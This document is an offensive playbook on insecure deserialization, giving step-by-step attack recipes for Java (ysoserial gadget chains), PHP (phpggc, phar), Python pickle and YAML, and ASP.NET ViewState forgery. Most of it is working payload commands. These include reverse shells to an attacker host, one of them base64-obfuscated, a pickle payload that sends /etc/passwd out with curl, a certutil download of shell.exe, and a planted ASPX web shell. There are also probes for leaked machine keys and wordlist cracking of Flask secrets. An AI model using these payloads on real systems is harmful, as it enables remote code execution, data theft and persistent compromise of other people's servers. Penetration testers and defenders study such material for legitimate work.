# Web – Insecure Deserialization

### Java Deserialization via ysoserial [added: 2026-04]
- **Tags:** #Deserialization #Java #ysoserial #RCE #CommonsCollections #Spring #GadgetChain #OWASPA8 #ObjectInputStream #Base64Payload
- **Trigger:** Application accepts serialized Java objects — indicators include `Content-Type: application/x-java-serialized-object`, base64 blobs starting with `rO0AB` (magic bytes `ac ed 00 05` in hex), cookies or parameters with serialized data, or Java stack traces in error responses mentioning ObjectInputStream
- **Prereq:** Java application that deserializes user-controlled data + a vulnerable library on the classpath that provides a gadget chain (Commons Collections, Spring, Groovy, etc.) + ysoserial installed
- **Yields:** Remote code execution on the Java application server — execute OS commands, establish reverse shell, read/write files
- **Opsec:** Med
- **Context:** Java deserialization is one of the most impactful web vulnerabilities. When a Java app calls `ObjectInputStream.readObject()` on user input, the entire classpath becomes the attack surface. ysoserial generates serialized payloads using known gadget chains from common libraries. The challenge is identifying which libraries are on the classpath — try multiple gadget chains or fingerprint via error messages. Look for serialized data in cookies, POST bodies, RMI/JMX services, and custom protocols.
- **Payload/Method:**
```bash
# Step 1: Identify Java serialization in use
# Look for magic bytes in HTTP traffic:
# Hex: ac ed 00 05 → Base64: rO0AB
# Check cookies, POST parameters, and custom headers for base64 blobs
echo "rO0ABXNyABFqYXZh..." | base64 -d | xxd | head -1
# Should show: aced 0005 (Java serialization magic bytes)

# Step 2: Generate payloads with ysoserial (try multiple gadget chains)
# Download: https://github.com/frohoff/ysoserial
# CommonCollections (most common — try CC1 through CC7):
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER:8080/deser_confirm" | base64 -w0 > payload_cc1.b64
java -jar ysoserial.jar CommonsCollections5 "curl http://ATTACKER:8080/deser_confirm" | base64 -w0 > payload_cc5.b64
java -jar ysoserial.jar CommonsCollections7 "curl http://ATTACKER:8080/deser_confirm" | base64 -w0 > payload_cc7.b64

# Step 3: Try other common gadget chains
for gadget in CommonsCollections1 CommonsCollections5 CommonsCollections6 CommonsCollections7 CommonsCollectionsK1 Spring1 Spring2 Groovy1 BeanShell1 Jdk7u21; do
  echo "[*] Generating ${gadget}..."
  java -jar ysoserial.jar ${gadget} "curl ATTACKER:8080/${gadget}" 2>/dev/null | base64 -w0 > "payload_${gadget}.b64"
done

# Step 4: Deliver the payload
# Via POST body:
curl -X POST "http://target/api/endpoint" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @<(java -jar ysoserial.jar CommonsCollections5 "id")

# Via Cookie (base64 encoded):
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections5 "curl ATTACKER:8080/rce" | base64 -w0)
curl "http://target/dashboard" -H "Cookie: session=${PAYLOAD}"

# Step 5: Reverse shell payload
java -jar ysoserial.jar CommonsCollections5 \
  'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}' \
  | base64 -w0

# Step 6: Blind detection with DNS/HTTP callback
java -jar ysoserial.jar URLDNS "http://java-deser.ATTACKER_COLLAB_DOMAIN" | base64 -w0
# URLDNS works with ANY Java version, no gadget chain needed — best for detection

# Step 7: Use ysoserial-modified for newer gadget chains
# https://github.com/pimps/ysoserial-modified
# Or JNDI injection with marshalsec for Log4Shell-style attacks:
java -jar ysoserial.jar JRMPClient "ATTACKER:1099" | base64 -w0
```

### PHP Object Injection via unserialize() [added: 2026-04]
- **Tags:** #Deserialization #PHP #ObjectInjection #unserialize #MagicMethods #__wakeup #__destruct #OWASPA8 #phpggc #GadgetChain
- **Trigger:** PHP application deserializes user input — indicators include `O:` or `a:` prefixed strings in cookies/parameters (PHP serialized format), `unserialize()` in source code, or frameworks known to use serialization (Laravel, Symfony, WordPress plugins, Magento)
- **Prereq:** PHP application that calls `unserialize()` on user-controlled data + classes with exploitable magic methods (__wakeup, __destruct, __toString, __call) in the autoload path + phpggc for framework-specific gadget chains
- **Yields:** Remote code execution, file read/write, SQL injection, or denial of service — depending on the available magic method chain
- **Opsec:** Med
- **Context:** PHP serialized objects look like `O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}`. When `unserialize()` is called, PHP instantiates the object and triggers magic methods (__wakeup on creation, __destruct on garbage collection, __toString when cast to string). If any class in the autoload path has a dangerous operation in these methods, you get code execution. phpggc has pre-built chains for major frameworks.
- **Payload/Method:**
```bash
# Step 1: Identify PHP serialization
# Look for serialized strings in cookies, POST parameters, or GET parameters:
# O:4:"User":1:{s:4:"name";s:5:"admin";}  → serialized object
# a:2:{s:4:"user";s:5:"admin";s:4:"role";s:5:"admin";}  → serialized array

# Step 2: Simple property manipulation (no gadget chain needed)
# If the app deserializes a User object and checks $user->role:
php -r 'echo serialize(new class { public $name="admin"; public $role="administrator"; public $isAdmin=true; });'
# Output: O:... — URL-encode and inject into the parameter

# Step 3: Craft a malicious object manually
php -r '
class EvilClass {
    public $cmd = "id";
    function __destruct() { system($this->cmd); }
    function __wakeup() { system($this->cmd); }
}
echo serialize(new EvilClass());
'
# Only works if EvilClass (or similar) exists in the target app's autoloader

# Step 4: Use phpggc for framework gadget chains
# https://github.com/ambionics/phpggc
# List available chains:
phpggc -l
# Laravel RCE:
phpggc Laravel/RCE1 system "id" -b       # -b for base64
phpggc Laravel/RCE5 system "id" -u       # -u for URL encoding
# Symfony RCE:
phpggc Symfony/RCE1 "system" "id" -b
# WordPress (specific plugins):
phpggc WordPress/RCE1 system "id" -b
# Magento:
phpggc Magento/SQLI "SELECT * FROM admin_user" -b
# Monolog (common logging library):
phpggc Monolog/RCE1 system "id" -b

# Step 5: Inject the payload
# Via cookie:
PAYLOAD=$(phpggc Laravel/RCE5 system "curl ATTACKER:8080/rce" -b)
curl "http://target/dashboard" -H "Cookie: session=${PAYLOAD}"

# Via POST parameter:
PAYLOAD=$(phpggc Symfony/RCE1 system "id" -u)
curl -X POST "http://target/api/import" -d "data=${PAYLOAD}"

# Step 6: Phar deserialization (trigger unserialize via file operations)
# If the app uses file operations (file_exists, is_dir, fopen) on user-controlled paths:
# Create a malicious .phar file:
phpggc Laravel/RCE5 system "id" --phar phar -o evil.phar
# Trigger via phar:// wrapper:
curl "http://target/api/check?file=phar:///tmp/uploads/evil.phar/test"

# Step 7: Reverse shell
phpggc Laravel/RCE5 system 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"' -b
```

### Python Pickle RCE [added: 2026-04]
- **Tags:** #Deserialization #Python #Pickle #RCE #__reduce__ #Flask #Django #OWASPA8 #Base64Payload #SessionCookie #RemoteCodeExecution
- **Trigger:** Python application deserializes user-controlled data using pickle, shelve, or yaml.load — indicators include base64-encoded blobs in cookies (especially Flask session cookies with pickle-based sessions), `pickle.loads()` in source code, or Python-specific APIs that accept serialized objects
- **Prereq:** Python application that calls `pickle.loads()`, `pickle.load()`, `shelve.open()`, or `yaml.load()` (with Loader=Loader) on user-controlled input + network egress or in-band output for confirming execution
- **Yields:** Remote code execution — pickle deserialization is almost always RCE in Python because the `__reduce__` method allows arbitrary function execution during deserialization
- **Opsec:** Med
- **Context:** Unlike Java where you need specific gadget chains, Python pickle RCE is straightforward — any class with a `__reduce__` method can execute arbitrary code during deserialization. There are no safe gadgets to worry about; if you control the pickled data, you get RCE. Common vectors include Flask session cookies (if the secret key is known or the session backend uses pickle), machine learning model files (.pkl), and any API that accepts serialized Python objects.
- **Payload/Method:**
```bash
# Step 1: Generate a pickle RCE payload
python3 << 'PYEOF'
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(RCE())
print(f"Raw bytes (hex): {payload.hex()}")
print(f"Base64: {base64.b64encode(payload).decode()}")
PYEOF

# Step 2: Reverse shell payload
python3 << 'PYEOF'
import pickle
import base64
import os

class ReverseShell:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))

payload = base64.b64encode(pickle.dumps(ReverseShell())).decode()
print(f"Payload: {payload}")
PYEOF

# Step 3: Inject into the vulnerable parameter
PAYLOAD=$(python3 -c "
import pickle, base64, os
class R:
    def __reduce__(self):
        return (os.system, ('curl ATTACKER:8080/pickle_rce',))
print(base64.b64encode(pickle.dumps(R())).decode())
")
curl -X POST "http://target/api/load" -d "data=${PAYLOAD}"
# Or via cookie:
curl "http://target/dashboard" -H "Cookie: session=${PAYLOAD}"

# Step 4: Out-of-band data exfiltration via pickle
python3 << 'PYEOF'
import pickle
import base64

# This payload uses subprocess to exfil data via curl
class Exfil:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['bash', '-c', 'curl -d "$(cat /etc/passwd)" http://ATTACKER:8080/exfil'],))

print(base64.b64encode(pickle.dumps(Exfil())).decode())
PYEOF

# Step 5: Flask session cookie forgery (if secret key is known)
# Flask signs session cookies with itsdangerous — if you have the secret:
pip install flask-unsign
flask-unsign --decode --cookie "SESSION_COOKIE_VALUE"
flask-unsign --sign --cookie "{'user': 'admin', 'role': 'administrator'}" --secret "SECRET_KEY"
# If the session uses pickle backend:
flask-unsign --unsign --cookie "SESSION_COOKIE_VALUE" --wordlist /usr/share/wordlists/rockyou.txt

# Step 6: YAML deserialization (same concept, different format)
# If app uses yaml.load() with Loader=Loader (or PyYAML < 5.1 without safe_load):
cat > evil.yaml << 'YAMLEOF'
!!python/object/apply:os.system
- "curl ATTACKER:8080/yaml_rce"
YAMLEOF
# Inject YAML content into the parameter
```

### .NET ViewState Deserialization [added: 2026-04]
- **Tags:** #Deserialization #DotNet #ViewState #ysoserial_net #MachineKey #ASP_NET #RCE #OWASPA8 #WebForms #ObjectStateFormatter
- **Trigger:** ASP.NET application uses ViewState (look for `__VIEWSTATE` hidden field in HTML forms) — if the machine key is known (from config disclosure, default keys, or leaked web.config), you can forge malicious ViewState payloads
- **Prereq:** ASP.NET application with ViewState enabled + known machine key (validationKey and decryptionKey from web.config) OR ViewState MAC validation disabled + ysoserial.net installed on a Windows machine
- **Yields:** Remote code execution on the IIS/.NET server — execute commands, establish reverse shell, access internal network
- **Opsec:** Med
- **Context:** ASP.NET ViewState is serialized with ObjectStateFormatter and protected by a machine key (MAC + optional encryption). If you obtain the machine key (web.config disclosure, default keys, Telerik/Exchange vulnerabilities), you can craft malicious ViewState payloads. In rare cases, MAC validation is disabled (`enableViewStateMac="false"`), allowing direct injection without a key. Check for common paths to web.config and Telerik dialog handlers that leak keys.
- **Payload/Method:**
```bash
# Step 1: Identify ViewState in the target
curl -s "http://target/" | grep -oP '__VIEWSTATE[^"]*"[^"]*"'
# Decode ViewState to check if it's encrypted/signed:
# Unencrypted starts with /wEP... (base64 of serialized data)

# Step 2: Check if ViewState MAC validation is disabled (rare but devastating)
# Inject a tampered ViewState — if the app processes it without error, MAC is disabled
# Blacklist3r can analyze ViewState:
# https://github.com/NotSoSecure/Blacklist3r
Blacklist3r.exe --viewstate "/wEPDwUKMTY..." --generator "ABCD" --path "/" --apppath "/"

# Step 3: Obtain the machine key
# Common disclosure vectors:
# web.config disclosure:
curl -s "http://target/web.config"
curl -s "http://target/Web.config"
# IIS shortname scanner:
java -jar iis_shortname_scanner.jar http://target/
# Telerik UI (CVE-2017-9248):
curl -s "http://target/Telerik.Web.UI.DialogHandler.aspx?dp=1"
# Trace.axd (if tracing enabled):
curl -s "http://target/Trace.axd"
# Look for:
# <machineKey validationKey="..." decryptionKey="..." validation="SHA1" decryption="AES" />

# Step 4: Generate malicious ViewState with ysoserial.net (on Windows)
# https://github.com/pwntester/ysoserial.net
# Basic RCE:
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "powershell -e BASE64_ENCODED_PAYLOAD" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HERE" \
  --decryptionalg="AES" \
  --decryptionkey="DECRYPTION_KEY_HERE" \
  --path="/target-page.aspx" \
  --apppath="/" \
  --islegacy

# Step 5: Generate with specific generator value (found in __VIEWSTATEGENERATOR)
GENERATOR=$(curl -s "http://target/page.aspx" | grep -oP 'VIEWSTATEGENERATOR[^"]*value="([^"]+)"' | grep -oP '(?<=value=")[^"]+')
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "certutil -urlcache -f http://ATTACKER/shell.exe C:\Windows\Temp\shell.exe" \
  --validationalg="SHA1" --validationkey="KEY" \
  --generator="${GENERATOR}" --path="/page.aspx" --apppath="/" --islegacy

# Step 6: Deliver the payload
# URL-encode the ViewState and POST it:
curl -X POST "http://target/page.aspx" \
  -d "__VIEWSTATE=URL_ENCODED_PAYLOAD&__VIEWSTATEGENERATOR=${GENERATOR}&__EVENTVALIDATION=..."

# Step 7: Alternative — if you can write a web shell
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "echo ^<%@ Page Language=\"C#\" %^>^<%= System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \" + Request[\"c\"]).StandardOutput.ReadToEnd() %^> > C:\inetpub\wwwroot\cmd.aspx" \
  --validationalg="SHA1" --validationkey="KEY" --path="/page.aspx" --apppath="/"
# Then: curl "http://target/cmd.aspx?c=whoami"
```
